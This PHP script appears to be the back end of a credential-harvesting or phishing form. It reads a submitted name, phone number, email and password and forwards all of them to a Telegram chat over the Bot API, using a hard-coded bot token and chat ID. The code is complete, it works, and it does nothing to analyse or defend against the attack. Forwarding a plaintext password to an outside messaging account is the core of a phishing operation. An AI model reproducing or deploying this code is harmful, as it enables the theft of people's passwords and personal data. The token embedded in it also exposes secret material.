<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $name = htmlspecialchars($_POST['name']);
    $phone = htmlspecialchars($_POST['phone']);
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

 // Telegram bot token and chat ID
 $botToken = "8098501021:AAGbAdK3olQzWW4iqHsdB26ps8lAaQDFXNg"; // Replace with your bot token
 $chatId = "7233135247"; // Replace with your chat ID

    // Create the message
    $message = "Customer Information:\n";
    $message .= "Name: $name\n";
    $message .= "Phone: $phone\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";

    // Send the message to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Use file_get_contents to send the request
    $response = file_get_contents($url);
    
    // Check if the request was successful
    if ($response === FALSE) {
        echo json_encode(['status' => 'error', 'message' => 'Failed to send message to Telegram.']);
    } else {
        echo json_encode(['status' => 'success', 'message' => 'Customer information sent successfully.']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method.']);
}
?>